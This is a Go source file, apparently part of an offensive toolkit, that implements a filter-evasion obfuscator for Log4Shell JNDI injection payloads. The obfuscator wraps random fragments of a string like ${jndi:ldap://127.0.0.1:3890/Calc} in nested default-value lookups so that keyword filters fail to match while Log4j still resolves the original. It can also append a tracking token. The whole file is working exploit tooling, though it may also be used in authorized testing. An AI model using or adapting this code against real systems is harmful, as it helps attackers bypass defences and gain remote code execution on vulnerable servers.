package log4shell

import (
	"fmt"
	"math/rand"
	"strings"
)

// raw: ${jndi:ldap://127.0.0.1:3890/Calc}
//
// obfuscate rule:
// 1. ${xxx-xxx:any-code:-bc} => bc

// skippedChars contain skip character, if Obfuscate
// select section contains these characters, they will
// not be obfuscated.
var skippedChars = map[byte]struct{}{
	'$': {},
	'{': {},
	'}': {},
}

// Obfuscate is used to obfuscate malicious(payload) string
// like ${jndi:ldap://127.0.0.1:3890/Calc} for log4j2 package.
// Return value are obfuscated string and raw with token.
func Obfuscate(raw string, token bool) (string, string) {
	l := len(raw)
	if l == 0 {
		return "", ""
	}

	// add token to the end of class name
	var rwt string // raw with token
	if token {
		// ${jndi:ldap://127.0.0.1:3890/Calc$token}
		front := raw[:len(raw)-1]
		token := randString(16)
		last := string(raw[len(raw)-1])
		raw = fmt.Sprintf("%s$%s%s", front, token, last)

		rwt = raw
		l = len(raw)
	}

	obfuscated := strings.Builder{}

	remaining := l
	index := 0

	// prevent not obfuscate twice, otherwise maybe
	// generate string like 1."jn" 2."di" -> "jndi"
	lastObfuscated := true

	for {
		// first select section length
		// use 0-3 is used to prevent include special
		// string like "jndi", "ldap" and "http"
		size := rand.Intn(4) // #nosec
		if size > remaining {
			size = remaining
		}
		section := raw[index : index+size]

		// contain special character
		var skip bool
		for i := 0; i < len(section); i++ {
			_, ok := skippedChars[section[i]]
			if ok {
				skip = true
				break
			}
		}

		// obfuscate or not
		if skip || (!randBool() && lastObfuscated) {
			obfuscated.WriteString(section)

			remaining -= size
			if remaining <= 0 {
				break
			}
			index += size
			lastObfuscated = false
			continue
		}

		// generate useless data before section
		obfuscated.WriteString("${")
		n := 1 + rand.Intn(3) // 1-3 // #nosec
		for i := 0; i < n; i++ {
			front := randString(2 + rand.Intn(5)) // #nosec
			end := randString(2 + rand.Intn(5))   // #nosec

			obfuscated.WriteString(front)
			if randBool() {
				obfuscated.WriteString(":")
			} else {
				obfuscated.WriteString("-")
			}
			obfuscated.WriteString(end)
		}
		obfuscated.WriteString(":-")
		obfuscated.WriteString(section)
		obfuscated.WriteString("}")

		remaining -= size
		if remaining <= 0 {
			break
		}
		index += size
		lastObfuscated = true
	}

	return obfuscated.String(), rwt
}
